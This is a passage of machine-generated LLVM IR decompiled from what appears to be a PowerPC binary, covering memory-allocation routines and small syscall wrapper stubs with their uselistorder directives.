  %v2_10007aec = add i32 %v1_10007aec, 4
  %v3_10007aec = inttoptr i32 %v2_10007aec to i32*
  store i32 %v0_10007aec, i32* %v3_10007aec, align 4
  %v3_10007af0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007af0, i32* %r3.global-to-local, align 4
  store i32 268466936, i32* @lr, align 4
  %v1_10007af4 = call i32 @function_10007e44(i32 %v3_10007af0)
  store i32 %v1_10007af4, i32* %r3.global-to-local, align 4
  %v0_10007af8 = load i32, i32* @r26, align 4
  %v1_10007af8 = load i32, i32* @r20, align 4
  %v2_10007af8 = inttoptr i32 %v1_10007af8 to i32*
  store i32 %v0_10007af8, i32* %v2_10007af8, align 4
  br label %dec_label_pc_10007b04

dec_label_pc_10007b04:                            ; preds = %dec_label_pc_10007b0c, %dec_label_pc_10007950, %dec_label_pc_10007ac4
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10007ac4 ], [ 2, %dec_label_pc_10007950 ], [ 2, %dec_label_pc_10007b0c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10007ac4 ], [ 1, %dec_label_pc_10007950 ], [ 1, %dec_label_pc_10007b0c ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_10007b04 = load i32, i32* @r24, align 4
  %v2_10007b04 = inttoptr i32 %v1_10007b04 to i32*
  store i32 %storemerge, i32* %v2_10007b04, align 4
  br label %dec_label_pc_10007b24

dec_label_pc_10007b0c:                            ; preds = %dec_label_pc_10007aa0
  %v3_10007b0c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007b0c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007b14.256 to i32), i32* @lr, align 4
  %v1_10007b10 = call i32 @function_10007e44(i32 %v3_10007b0c)
  store i32 %v1_10007b10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b04

dec_label_pc_10007b20:                            ; preds = %dec_label_pc_100078e4, %dec_label_pc_100078c8, %dec_label_pc_100078bc, %dec_label_pc_100078ac, %dec_label_pc_1000789c
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b24

dec_label_pc_10007b24:                            ; preds = %dec_label_pc_10007880, %dec_label_pc_10007878, %dec_label_pc_1000782c, %dec_label_pc_100077f4, %dec_label_pc_10007b04, %dec_label_pc_100079e0, %dec_label_pc_10007924, %dec_label_pc_10007b20
  store i32 %v0_100077f8, i32* %r0.global-to-local, align 4
  %v0_10007b34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007b34

; uselistorder directives
  uselistorder i32 %v0_10007aa8, { 1, 0 }
  uselistorder i32 %v1_10007a78, { 1, 0 }
  uselistorder i32 %v1_10007a6c, { 1, 0 }
  uselistorder i32 %v1_10007a64, { 1, 0 }
  uselistorder i32 %v0_10007a50, { 1, 0 }
  uselistorder i32 %v1_10007a643, { 1, 0 }
  uselistorder i32 %v1_10007a2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10007a24, { 1, 0, 2 }
  uselistorder i32 %v0_100079ac, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_100078f0, { 1, 0, 2 }
  uselistorder i32 %v0_100078ac.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10007894, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 25, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 2, 23, 24, 26, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 19, 8, 6, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10007b24, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10007b04, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007aa0, { 1, 0 }
  uselistorder label %dec_label_pc_10007a4c, { 1, 0 }
  uselistorder label %dec_label_pc_100078ac, { 1, 0 }
}

define i32 @function_10007b38(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007b38:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007b4c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467036, i32* @lr, align 4
  %v2_10007b58 = call i32 @function_10008fe0(i32 5, i32 %v2_10007b4c)
  ret i32 %v2_10007b58

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007b6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007b6c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007b80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467088, i32* @lr, align 4
  %v2_10007b8c = call i32 @function_10008fe0(i32 2, i32 %v2_10007b80)
  ret i32 %v2_10007b8c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007ba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007ba0:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007bb4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467140, i32* @lr, align 4
  %v2_10007bc0 = call i32 @function_10008fe0(i32 3, i32 %v2_10007bb4)
  ret i32 %v2_10007bc0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007bd4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007bd4:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007be8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467188, i32* @lr, align 4
  %v2_10007bf0 = call i32 @function_10008fe0(i32 4, i32 %v2_10007be8)
  ret i32 %v2_10007bf0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007c04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007c04:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007c18 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467244, i32* @lr, align 4
  %v2_10007c28 = call i32 @function_10008fe0(i32 10, i32 %v2_10007c18)
  ret i32 %v2_10007c28

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007c3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007c3c:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10007c50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467308, i32* @lr, align 4
  %v2_10007c68 = call i32 @function_10008fe0(i32 11, i32 %v2_10007c50)
  ret i32 %v2_10007c68

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10007c7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007c7c:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10007c90 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467368, i32* @lr, align 4
  %v2_10007ca4 = call i32 @function_10008fe0(i32 14, i32 %v2_10007c90)
  ret i32 %v2_10007ca4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10007cb8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007cb8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007ccc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467420, i32* @lr, align 4
  %v2_10007cd8 = call i32 @function_10008fe0(i32 1, i32 %v2_10007ccc)
  ret i32 %v2_10007cd8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007cec(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007cec:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10007cf4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007cf4 = icmp eq i32 %v0_10007cf4, 0
  br i1 %v3_10007cf4, label %dec_label_pc_10007d04, label %dec_label_pc_10007d08

dec_label_pc_10007d04:                            ; preds = %dec_label_pc_10007cec
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007d08

dec_label_pc_10007d08:                            ; preds = %dec_label_pc_10007cec, %dec_label_pc_10007d04
  %v0_10007d18 = phi i32 [ 1, %dec_label_pc_10007d04 ], [ %v0_10007cf4, %dec_label_pc_10007cec ]
  %v3_10007d0c = icmp ugt i32 %v0_10007d18, -8
  br i1 %v3_10007d0c, label %dec_label_pc_10007e1c, label %dec_label_pc_10007d14

dec_label_pc_10007d14:                            ; preds = %dec_label_pc_10007d08
  %v1_10007d18 = add i32 %v0_10007d18, 4
  store i32 ptrtoint (i32* @global_var_10012af4.257 to i32), i32* @r29, align 4
  store i32 %v1_10007d18, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10012af4.257 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d28 = call i32 @function_10008c78()
  %v2_10007d30 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088), i32* %r3.global-to-local, align 4
  %v3_10007d38 = call i32 @function_10007f44(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088) to i32*), i32 %v2_10007d30)
  store i32 %v3_10007d38, i32* %r31.global-to-local, align 4
  %v0_10007d40 = load i32, i32* @r29, align 4
  store i32 %v0_10007d40, i32* %r3.global-to-local, align 4
  %v0_10007d44 = call i32 @function_10008c78()
  store i32 %v0_10007d44, i32* %r3.global-to-local, align 4
  %v3_10007d48 = icmp eq i32 %v3_10007d38, 0
  br i1 %v3_10007d48, label %dec_label_pc_10007d50, label %dec_label_pc_10007e00.thread

dec_label_pc_10007e00.thread:                     ; preds = %dec_label_pc_10007d14
  br label %dec_label_pc_10007e14

dec_label_pc_10007d50:                            ; preds = %dec_label_pc_10007d14
  %v3_10007d54 = load i32, i32* @global_var_100104ac.260, align 4
  store i32 %v3_10007d54, i32* %r31.global-to-local, align 4
  %v3_10007d58 = load i32, i32* %stack_var_-40, align 4
  %v2_10007d5c = icmp ult i32 %v3_10007d58, %v3_10007d54
  br i1 %v2_10007d5c, label %dec_label_pc_10007d74, label %dec_label_pc_10007d64

dec_label_pc_10007d64:                            ; preds = %dec_label_pc_10007d50
  %v1_10007d68 = sub i32 0, %v3_10007d54
  %v2_10007d64 = add i32 %v3_10007d54, -1
  %v1_10007d6c = add i32 %v2_10007d64, %v3_10007d58
  %v2_10007d70 = and i32 %v1_10007d6c, %v1_10007d68
  store i32 %v2_10007d70, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007d74

dec_label_pc_10007d74:                            ; preds = %dec_label_pc_10007d50, %dec_label_pc_10007d64
  store i32 ptrtoint (i32* @global_var_10012d24.261 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d80 = call i32 @function_10008c78()
  %v0_10007d84 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10007d84, i32* %r3.global-to-local, align 4
  store i32 268467596, i32* @lr, align 4
  %v1_10007d88 = call i32 @function_10009414(i32 %v0_10007d84)
  store i32 %v1_10007d88, i32* %r3.global-to-local, align 4
  %v3_10007d8c = icmp eq i32 %v1_10007d88, -1
  br i1 %v3_10007d8c, label %dec_label_pc_10007dac, label %dec_label_pc_10007d94

dec_label_pc_10007d94:                            ; preds = %dec_label_pc_10007d74
  %v1_10007d94 = add i32 %v1_10007d88, 3
  %v1_10007d98 = call i32 @__asm_rlwinm(i32 %v1_10007d94, i32 0, i32 0, i32 29)
  store i32 %v1_10007d98, i32* @r30, align 4
  %v4_10007d9c = icmp eq i32 %v1_10007d98, %v1_10007d88
  br i1 %v4_10007d9c, label %dec_label_pc_10007dac, label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007d94
  %v2_10007da4 = sub i32 %v1_10007d98, %v1_10007d88
  store i32 %v2_10007da4, i32* %r3.global-to-local, align 4
  store i32 268467628, i32* @lr, align 4
  %v1_10007da8 = call i32 @function_10009414(i32 %v2_10007da4)
  store i32 %v1_10007da8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007dac

dec_label_pc_10007dac:                            ; preds = %dec_label_pc_10007d94, %dec_label_pc_10007d74, %dec_label_pc_10007da4
  store i32 ptrtoint (i32* @global_var_10012d24.261 to i32), i32* %r3.global-to-local, align 4
  %v0_10007db4 = call i32 @function_10008c78()
  store i32 %v0_10007db4, i32* %r3.global-to-local, align 4
  %v0_10007db8 = load i32, i32* @r30, align 4
  %v3_10007db8 = icmp eq i32 %v0_10007db8, -1
  br i1 %v3_10007db8, label %dec_label_pc_10007e1c, label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007dac
  store i32 ptrtoint (i32* @global_var_10012af4.257 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010440 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10012af4.257 to i32), i32* %r3.global-to-local, align 4
  %v0_10007dd4 = call i32 @function_10008c78()
  %v0_10007dd8 = load i32, i32* @r31, align 4
  %v0_10007ddc = load i32, i32* @r30, align 4
  %v0_10007de0 = load i32, i32* @r29, align 4
  store i32 %v0_10007de0, i32* %r3.global-to-local, align 4
  store i32 268467688, i32* @lr, align 4
  %v3_10007de4 = inttoptr i32 %v0_10007de0 to i32*
  %v4_10007de4 = call i32 @function_1000802c(i32* %v3_10007de4, i32 %v0_10007ddc, i32 %v0_10007dd8)
  %v0_10007de8 = load i32, i32* @r29, align 4
  store i32 %v0_10007de8, i32* %r3.global-to-local, align 4
  %v2_10007df0 = inttoptr i32 %v0_10007de8 to i32*
  %v3_10007df0 = call i32 @function_10007f44(i32* %v2_10007df0, i32 %v2_10007d30)
  store i32 %v3_10007df0, i32* %r31.global-to-local, align 4
  %v0_10007df8 = load i32, i32* @r28, align 4
  store i32 %v0_10007df8, i32* %r3.global-to-local, align 4
  %v0_10007dfc = call i32 @function_10008c78()
  store i32 %v0_10007dfc, i32* %r3.global-to-local, align 4
  %v3_10007e00 = icmp eq i32 %v3_10007df0, 0
  br i1 %v3_10007e00, label %dec_label_pc_10007e14.thread, label %dec_label_pc_10007e14

dec_label_pc_10007e14.thread:                     ; preds = %dec_label_pc_10007e00
  br label %dec_label_pc_10007e1c

dec_label_pc_10007e14:                            ; preds = %dec_label_pc_10007e00, %dec_label_pc_10007e00.thread
  %v0_10007e14.pr6 = phi i32 [ %v3_10007d38, %dec_label_pc_10007e00.thread ], [ %v3_10007df0, %dec_label_pc_10007e00 ]
  %v3_10007e08 = load i32, i32* %stack_var_-40, align 4
  %v2_10007e0c = inttoptr i32 %v0_10007e14.pr6 to i32*
  store i32 %v3_10007e08, i32* %v2_10007e0c, align 4
  %v0_10007e10 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e10 = add i32 %v0_10007e10, 4
  store i32 %v1_10007e10, i32* @r31, align 4
  %v3_10007e14 = icmp eq i32 %v1_10007e10, 0
  br i1 %v3_10007e14, label %dec_label_pc_10007e1c, label %dec_label_pc_10007e2c

dec_label_pc_10007e1c:                            ; preds = %dec_label_pc_10007e14.thread, %dec_label_pc_10007e14, %dec_label_pc_10007dac, %dec_label_pc_10007d08
  %v0_10007e1c = call i32 @function_10004b48()
  store i32 %v0_10007e1c, i32* %r3.global-to-local, align 4
  %v2_10007e24 = inttoptr i32 %v0_10007e1c to i32*
  store i32 12, i32* %v2_10007e24, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10007e2c

dec_label_pc_10007e2c:                            ; preds = %dec_label_pc_10007e14, %dec_label_pc_10007e1c
  %v0_10007e30 = phi i32 [ %v1_10007e10, %dec_label_pc_10007e14 ], [ 0, %dec_label_pc_10007e1c ]
  store i32 %v0_10007e30, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007e30

; uselistorder directives
  uselistorder i32 %v0_10007e30, { 1, 0 }
  uselistorder i32 %v1_10007e10, { 1, 0, 2 }
  uselistorder i32 %v1_10007d98, { 1, 0, 2 }
  uselistorder i32 %v1_10007d88, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10007d54, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10007d38, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 2, 16, 15, 3, 17, 18, 19, 20, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10012af4.257 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10007e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10007e1c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10007dac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007d74, { 1, 0 }
  uselistorder label %dec_label_pc_10007d08, { 1, 0 }
}

define i32 @function_10007e44(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007e44:
  %v3_10007e4c = icmp eq i32 %arg1, 0
  br i1 %v3_10007e4c, label %dec_label_pc_10007f30, label %dec_label_pc_10007e5c

dec_label_pc_10007e5c:                            ; preds = %dec_label_pc_10007e44
  %v1_10007e60 = add i32 %arg1, -4
  %v2_10007e60 = inttoptr i32 %v1_10007e60 to i32*
  %v3_10007e60 = load i32, i32* %v2_10007e60, align 4
  store i32 %v3_10007e60, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r26, align 4
  %v0_10007e74 = call i32 @function_10008c78()
  %v0_10007e7c = load i32, i32* @r28, align 4
  store i32 268467848, i32* @lr, align 4
  %v4_10007e84 = call i32 @function_1000802c(i32* nonnull @global_var_10010440, i32 %v1_10007e60, i32 %v0_10007e7c)
  %v3_10007e8c = load i32, i32* @global_var_100104ac.260, align 4
  store i32 %v4_10007e84, i32* @r29, align 4
  %v1_10007e94 = inttoptr i32 %v4_10007e84 to i32*
  %v2_10007e94 = load i32, i32* %v1_10007e94, align 4
  store i32 %v2_10007e94, i32* @r27, align 4
  %v1_10007e98 = mul i32 %v3_10007e8c, 8
  %v2_10007e9c = icmp ult i32 %v2_10007e94, %v1_10007e98
  br i1 %v2_10007e9c, label %dec_label_pc_10007ed0, label %dec_label_pc_10007ea4

dec_label_pc_10007ea4:                            ; preds = %dec_label_pc_10007e5c
  store i32 ptrtoint (i32* @global_var_10012d24.261 to i32), i32* @r28, align 4
  %v0_10007eb4 = call i32 @function_10008c78()
  store i32 268467904, i32* @lr, align 4
  %v1_10007ebc = call i32 @function_10009414(i32 0)
  %v0_10007ec0 = load i32, i32* @r31, align 4
  %v4_10007ec0 = icmp eq i32 %v0_10007ec0, %v1_10007ebc
  br i1 %v4_10007ec0, label %dec_label_pc_10007ed8, label %dec_label_pc_10007ec8

dec_label_pc_10007ec8:                            ; preds = %dec_label_pc_10007ea4
  %v0_10007ecc = call i32 @function_10008c78()
  br label %dec_label_pc_10007ed0

dec_label_pc_10007ed0:                            ; preds = %dec_label_pc_10007e5c, %dec_label_pc_10007ec8
  br label %dec_label_pc_10007f2c

dec_label_pc_10007ed8:                            ; preds = %dec_label_pc_10007ea4
  %v0_10007ed8 = load i32, i32* @r29, align 4
  %v1_10007ed8 = add i32 %v0_10007ed8, 4
  %v2_10007ed8 = inttoptr i32 %v1_10007ed8 to i32*
  %v3_10007ed8 = load i32, i32* %v2_10007ed8, align 4
  %v3_10007edc = icmp eq i32 %v3_10007ed8, 0
  br i1 %v3_10007edc, label %dec_label_pc_10007eec, label %dec_label_pc_10007ee4

dec_label_pc_10007ee4:                            ; preds = %dec_label_pc_10007ed8
  %v1_10007ee4 = add i32 %v0_10007ed8, 8
  %v2_10007ee4 = inttoptr i32 %v1_10007ee4 to i32*
  %v3_10007ee4 = load i32, i32* %v2_10007ee4, align 4
  %v2_10007ee8 = add i32 %v3_10007ed8, 8
  %v3_10007ee8 = inttoptr i32 %v2_10007ee8 to i32*
  store i32 %v3_10007ee4, i32* %v3_10007ee8, align 4
  %v0_10007eec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007eec

dec_label_pc_10007eec:                            ; preds = %dec_label_pc_10007ed8, %dec_label_pc_10007ee4
  %v0_10007eec = phi i32 [ %v0_10007ed8, %dec_label_pc_10007ed8 ], [ %v0_10007eec.pre, %dec_label_pc_10007ee4 ]
  %v1_10007eec = add i32 %v0_10007eec, 8
  %v2_10007eec = inttoptr i32 %v1_10007eec to i32*
  %v3_10007eec = load i32, i32* %v2_10007eec, align 4
  %v1_10007ef0 = add i32 %v0_10007eec, 4
  %v2_10007ef0 = inttoptr i32 %v1_10007ef0 to i32*
  %v3_10007ef0 = load i32, i32* %v2_10007ef0, align 4
  %v3_10007ef4 = icmp eq i32 %v3_10007eec, 0
  br i1 %v3_10007ef4, label %dec_label_pc_10007f04, label %dec_label_pc_10007efc

dec_label_pc_10007efc:                            ; preds = %dec_label_pc_10007eec
  %v2_10007efc = add i32 %v3_10007eec, 4
  %v3_10007efc = inttoptr i32 %v2_10007efc to i32*
  store i32 %v3_10007ef0, i32* %v3_10007efc, align 4
  br label %dec_label_pc_10007f08

dec_label_pc_10007f04:                            ; preds = %dec_label_pc_10007eec
  store i32 %v3_10007ef0, i32* @global_var_10010440, align 4
  br label %dec_label_pc_10007f08

dec_label_pc_10007f08:                            ; preds = %dec_label_pc_10007efc, %dec_label_pc_10007f04
  %v0_10007f10 = call i32 @function_10008c78()
  %v0_10007f14 = load i32, i32* @r27, align 4
  %v1_10007f14 = load i32, i32* @r29, align 4
  %v0_10007f1c = load i32, i32* @r31, align 4
  %v2_10007f14 = sub i32 12, %v0_10007f14
  %v1_10007f18 = add i32 %v2_10007f14, %v1_10007f14
  %v2_10007f1c = sub i32 %v1_10007f18, %v0_10007f1c
  store i32 268468004, i32* @lr, align 4
  %v1_10007f20 = call i32 @function_10009414(i32 %v2_10007f1c)
  br label %dec_label_pc_10007f2c

dec_label_pc_10007f2c:                            ; preds = %dec_label_pc_10007ed0, %dec_label_pc_10007f08
  %v0_10007f2c = call i32 @function_10008c78()
  br label %dec_label_pc_10007f30

dec_label_pc_10007f30:                            ; preds = %dec_label_pc_10007e44, %dec_label_pc_10007f2c
  %v0_10007f40 = phi i32 [ 0, %dec_label_pc_10007e44 ], [ %v0_10007f2c, %dec_label_pc_10007f2c ]
  ret i32 %v0_10007f40

; uselistorder directives
  uselistorder i32 %v0_10007eec, { 1, 0 }
  uselistorder i32 (i32)* @function_10009414, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_10010440, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007f30, { 1, 0 }
  uselistorder label %dec_label_pc_10007f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10007f08, { 1, 0 }
  uselistorder label %dec_label_pc_10007eec, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed0, { 1, 0 }
}

define i32 @function_10007f44(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007f44:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10007f44 = inttoptr i32 %arg2 to i32*
  %v2_10007f44 = load i32, i32* %v1_10007f44, align 4
  %v1_10007f48 = add i32 %v2_10007f44, 3
  store i32 %v1_10007f48, i32* %r9.global-to-local, align 4
  %v1_10007f4c = call i32 @__asm_rlwinm(i32 %v1_10007f48, i32 0, i32 0, i32 29)
  %v2_10007f50 = icmp ugt i32 %v1_10007f4c, 11
  br i1 %v2_10007f50, label %dec_label_pc_10007fd4.preheader, label %dec_label_pc_10007f58

dec_label_pc_10007f58:                            ; preds = %dec_label_pc_10007f44
  br label %dec_label_pc_10007fd4.preheader

dec_label_pc_10007fd4.preheader:                  ; preds = %dec_label_pc_10007f44, %dec_label_pc_10007f58
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10007f58 ], [ %v1_10007f4c, %dec_label_pc_10007f44 ]
  %v0_10007fb8 = phi i32 [ 12, %dec_label_pc_10007f58 ], [ %v1_10007f4c, %dec_label_pc_10007f44 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_10007fd45 = icmp eq i32 %storemerge2, 0
  br i1 %v3_10007fd45, label %dec_label_pc_10007fdc, label %dec_label_pc_10007f64

dec_label_pc_10007f64:                            ; preds = %dec_label_pc_10007fd4.preheader, %dec_label_pc_10007fd0
  %v0_10007fd0 = phi i32 [ %storemerge, %dec_label_pc_10007fd0 ], [ %storemerge2, %dec_label_pc_10007fd4.preheader ]
  %v1_10007f64 = inttoptr i32 %v0_10007fd0 to i32*
  %v2_10007f64 = load i32, i32* %v1_10007f64, align 4
  store i32 %v2_10007f64, i32* %r10.global-to-local, align 4
  %v2_10007f68 = icmp ult i32 %v2_10007f64, %v0_10007fb8
  br i1 %v2_10007f68, label %dec_label_pc_10007fd0, label %dec_label_pc_10007f70

dec_label_pc_10007f70:                            ; preds = %dec_label_pc_10007f64
  %v1_10007f70 = add i32 %v0_10007fb8, 44
  %v2_10007f74 = icmp ult i32 %v2_10007f64, %v1_10007f70
  br i1 %v2_10007f74, label %dec_label_pc_10007f7c, label %dec_label_pc_10007fb8

dec_label_pc_10007f7c:                            ; preds = %dec_label_pc_10007f70
  %v1_10007f7c = add i32 %v0_10007fd0, 4
  %v2_10007f7c = inttoptr i32 %v1_10007f7c to i32*
  %v3_10007f7c = load i32, i32* %v2_10007f7c, align 4
  store i32 %v3_10007f7c, i32* %r11.global-to-local, align 4
  %v3_10007f80 = icmp eq i32 %v3_10007f7c, 0
  br i1 %v3_10007f80, label %dec_label_pc_10007f90, label %dec_label_pc_10007f88

dec_label_pc_10007f88:                            ; preds = %dec_label_pc_10007f7c
  %v1_10007f88 = add i32 %v0_10007fd0, 8
  %v2_10007f88 = inttoptr i32 %v1_10007f88 to i32*
  %v3_10007f88 = load i32, i32* %v2_10007f88, align 4
  %v2_10007f8c = add i32 %v3_10007f7c, 8
  %v3_10007f8c = inttoptr i32 %v2_10007f8c to i32*
  store i32 %v3_10007f88, i32* %v3_10007f8c, align 4
  %v0_10007f90.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10007fac.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007f90

dec_label_pc_10007f90:                            ; preds = %dec_label_pc_10007f7c, %dec_label_pc_10007f88
  %v0_10007fac = phi i32 [ %v2_10007f64, %dec_label_pc_10007f7c ], [ %v0_10007fac.pre, %dec_label_pc_10007f88 ]
  %v0_10007f90 = phi i32 [ %v0_10007fd0, %dec_label_pc_10007f7c ], [ %v0_10007f90.pre, %dec_label_pc_10007f88 ]
  %v1_10007f90 = add i32 %v0_10007f90, 8
  %v2_10007f90 = inttoptr i32 %v1_10007f90 to i32*
  %v3_10007f90 = load i32, i32* %v2_10007f90, align 4
  %v1_10007f94 = add i32 %v0_10007f90, 4
  %v2_10007f94 = inttoptr i32 %v1_10007f94 to i32*
  %v3_10007f94 = load i32, i32* %v2_10007f94, align 4
  %v3_10007f98 = icmp eq i32 %v3_10007f90, 0
  store i32 %v0_10007fac, i32* %r11.global-to-local, align 4
  br i1 %v3_10007f98, label %dec_label_pc_10007fac, label %dec_label_pc_10007fa0

dec_label_pc_10007fa0:                            ; preds = %dec_label_pc_10007f90
  %v2_10007fa4 = add i32 %v3_10007f90, 4
  %v3_10007fa4 = inttoptr i32 %v2_10007fa4 to i32*
  store i32 %v3_10007f94, i32* %v3_10007fa4, align 4
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fac:                            ; preds = %dec_label_pc_10007f90
  store i32 %v3_10007f94, i32* %arg1, align 4
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fb8:                            ; preds = %dec_label_pc_10007f70
  %v2_10007fb8 = sub i32 %v2_10007f64, %v0_10007fb8
  store i32 %v2_10007fb8, i32* %v1_10007f64, align 4
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fc0:                            ; preds = %dec_label_pc_10007fac, %dec_label_pc_10007fa0, %dec_label_pc_10007fb8
  %v0_10007fc0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007fc0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007fc0 = sub i32 %v1_10007fc0, %v0_10007fc0
  store i32 %v2_10007fc0, i32* %r9.global-to-local, align 4
  %v0_10007fc4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10007fc4, i32* %v1_10007f44, align 4
